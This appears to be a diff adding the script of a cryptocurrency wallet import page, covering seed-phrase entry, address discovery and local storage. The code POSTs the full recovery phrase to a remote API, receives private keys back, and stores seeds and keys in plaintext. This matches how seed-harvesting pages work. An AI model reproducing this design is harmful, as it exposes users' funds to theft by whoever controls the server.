+                        storedData.masterKeys.push(newMaster);
+                        storedData.nextId += 1;
+                        saveWallets(storedData);
+                        
+                        showStatus('Wallet imported successfully', 'success');
+                        privateKeyInput.value = '';
+                        setButtonLoading('importBtn', 'importContent', 'importSpinner', false);
+                    } else {
+                        throw new Error(data.error || 'Failed to import wallet');
+                    }
+                    return;
+                }
+
+                // Seed phrase import
+                const inputs = seedGrid.querySelectorAll('input');
+                const words = [];
+                inputs.forEach(inp => {
+                    if (inp.value.trim()) words.push(inp.value.trim());
+                });
+                
+                if (words.length !== 12) {
+                    showStatus('Please enter all 12 words of your recovery phrase.', 'error');
+                    setButtonLoading('importBtn', 'importContent', 'importSpinner', false);
+                    return;
+                }
+                
+                const seedPhrase = words.join(' ');
+                
+                // Check if already imported
+                const exists = storedData.masterKeys.some(mk => mk.seedPhrase === seedPhrase);
+                if (exists) {
+                    showStatus('This seed phrase is already imported.', 'warning');
+                    setButtonLoading('importBtn', 'importContent', 'importSpinner', false);
+                    return;
+                }
+
+                // Verify first address if provided
+                if (expectedAddress) {
+                    const verified = await verifyFirstAddress(seedPhrase, expectedAddress);
+                    if (!verified) {
+                        setButtonLoading('importBtn', 'importContent', 'importSpinner', false);
+                        return;
+                    }
+                } else {
+                    showStatus('Please enter your first address to verify the seed phrase.', 'warning');
+                    setButtonLoading('importBtn', 'importContent', 'importSpinner', false);
+                    return;
+                }
+
+                // Discover addresses
+                discoveredAddresses = [];
+                selectedAddresses = new Set();
+                
+                for (let i = 0; i < addressCount; i++) {
+                    showStatus(`Generating address ${i + 1}/${addressCount}...`, 'info');
+                    
+                    const response = await fetch(`${API_BASE}/import_seed/`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            seed_phrase: seedPhrase,
+                            path: 'standard',
+                            index: i
+                        })
+                    });
+                    
+                    if (!response.ok) {
+                        throw new Error(`API error: ${response.status}`);
+                    }
+                    
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        const isAlreadyImported = storedData.masterKeys.some(mk => 
+                            mk.children.some(child => child.address === data.address)
+                        );
+                        
+                        discoveredAddresses.push({
+                            index: i,
+                            address: data.address,
+                            privateKey: data.private_key,
+                            isImported: isAlreadyImported
+                        });
+                        
+                        if (!isAlreadyImported) {
+                            selectedAddresses.add(i);
+                        }
+                    } else {
+                        throw new Error(data.error || 'Failed to generate address');
+                    }
+                }
+                
+                // Display discovered addresses
+                displayAddresses(discoveredAddresses);
+                
+                const newAddresses = discoveredAddresses.filter(a => !a.isImported);
+                if (newAddresses.length > 0) {
+                    document.getElementById('importSelectedBtn').style.display = 'block';
+                    showStatus(`Found ${discoveredAddresses.length} addresses (${newAddresses.length} new, ${discoveredAddresses.length - newAddresses.length} already imported)`, 'info');
+                } else {
+                    document.getElementById('importSelectedBtn').style.display = 'none';
+                    showStatus('All discovered addresses are already imported.', 'info');
+                }
+                
+                setButtonLoading('importBtn', 'importContent', 'importSpinner', false);
+                
+            } catch (error) {
+                console.error('Error importing wallet:', error);
+                showStatus(`Error: ${error.message}`, 'error');
+                setButtonLoading('importBtn', 'importContent', 'importSpinner', false);
+            }
+        }
+
+        function displayAddresses(addresses) {
+            const display = document.getElementById('addressDisplay');
+            const list = document.getElementById('addressList');
+            
+            list.innerHTML = '';
+            
+            addresses.forEach((addr, index) => {
+                const div = document.createElement('div');
+                div.className = 'address-item';
+                div.id = `address-item-${index}`;
+                
+                const isChecked = selectedAddresses.has(index);
+                const statusBadge = addr.isImported ? 
+                    '<span class="status-badge imported">✓ Imported</span>' : 
+                    '<span class="status-badge new">New</span>';
+                
+                div.innerHTML = `
+                    <input type="checkbox" id="checkbox-${index}" ${isChecked && !addr.isImported ? 'checked' : ''} ${addr.isImported ? 'disabled' : ''} />
+                    <span class="index">#${addr.index}</span>
+                    <span class="addr">${addr.address}</span>
+                    ${statusBadge}
+                `;
+                
+                if (!addr.isImported) {
+                    const checkbox = div.querySelector('input[type="checkbox"]');
+                    checkbox.addEventListener('change', function() {
+                        if (this.checked) {
+                            selectedAddresses.add(index);
+                        } else {
+                            selectedAddresses.delete(index);
+                        }
+                    });
+                }
+                
+                list.appendChild(div);
+            });
+            
+            display.className = 'address-display visible';
+        }
+
+        function selectAllAddresses() {
+            discoveredAddresses.forEach((addr, index) => {
+                if (!addr.isImported) {
+                    const checkbox = document.getElementById(`checkbox-${index}`);
+                    if (checkbox) {
+                        checkbox.checked = true;
+                        selectedAddresses.add(index);
+                    }
+                }
+            });
+        }
+
+        async function importSelectedAddresses() {
+            const storedData = getStoredWallets();
+            const seedGrid = document.getElementById('seedGrid');
+            const inputs = seedGrid.querySelectorAll('input');
+            const words = [];
+            inputs.forEach(inp => {
+                if (inp.value.trim()) words.push(inp.value.trim());
+            });
+            const seedPhrase = words.join(' ');
+            
+            setButtonLoading('importSelectedBtn', 'importSelectedContent', 'importSelectedSpinner', true);
+            
+            try {
+                let importedCount = 0;
+                const selected = Array.from(selectedAddresses);
+                
+                for (const index of selected) {
+                    const addr = discoveredAddresses[index];
+                    if (!addr || addr.isImported) continue;
+                    
+                    const exists = storedData.masterKeys.some(mk => 
+                        mk.children.some(child => child.address === addr.address)
+                    );
+                    
+                    if (!exists) {
+                        let masterKey = storedData.masterKeys.find(mk => mk.seedPhrase === seedPhrase);
+                        
+                        if (!masterKey) {
+                            masterKey = {
+                                id: storedData.nextId,
+                                seedPhrase: seedPhrase,
+                                parentAddress: addr.address,
+                                parentPrivateKey: addr.privateKey,
+                                createdAt: new Date().toISOString(),
+                                children: []
+                            };
+                            storedData.masterKeys.push(masterKey);
+                            storedData.nextId += 1;
+                        }
+                        
+                        masterKey.children.push({
+                            index: addr.index,
+                            address: addr.address,
+                            privateKey: addr.privateKey
+                        });
+                        
+                        importedCount++;
+                    }
+                }
+                
+                saveWallets(storedData);
+                showStatus(`✅ Successfully imported ${importedCount} address(es)!`, 'success');
+                document.getElementById('importSelectedBtn').style.display = 'none';
+                
+                // Update the display
+                discoveredAddresses = discoveredAddresses.map(addr => {
+                    const isImported = storedData.masterKeys.some(mk => 
+                        mk.children.some(child => child.address === addr.address)
+                    );
+                    return { ...addr, isImported };
+                });
+                displayAddresses(discoveredAddresses);
+                
+            } catch (error) {
+                console.error('Error importing addresses:', error);
+                showStatus(`Error: ${error.message}`, 'error');
+            } finally {
+                setButtonLoading('importSelectedBtn', 'importSelectedContent', 'importSelectedSpinner', false);
+            }
+        }
+
+        function navigateTo(page) {
+            const messages = {
+                'learn': 'Recovery phrases are 12-24 words that can recover all your addresses. Keep them safe!',
+                'advanced': 'Advanced settings coming soon: custom derivation paths, multi-wallet management, and more.'
+            };
+
+            if (messages[page]) {
+                showStatus(messages[page], 'info');
+                setTimeout(() => {
+                    hideStatus();
+                }, 4000);
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const seedInputs = document.querySelectorAll('.seedGrid input');
+            seedInputs.forEach((input, index) => {
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Enter' && this.value.trim()) {
+                        e.preventDefault();
+                        const next = seedInputs[index + 1];
+                        if (next) next.focus();
+                    }
+                });
+            });
+
+            const storedData = getStoredWallets();
+            if (storedData.masterKeys.length > 0) {
+                const totalAddresses = storedData.masterKeys.reduce((sum, mk) => sum + mk.children.length, 0);
+                showStatus(`${storedData.masterKeys.length} wallet(s) loaded (${totalAddresses} total addresses)`, 'info');
+                setTimeout(() => {
+                    hideStatus();
+                }, 3000);
+            }
+        });
+    </script>
+</body>
+</html>
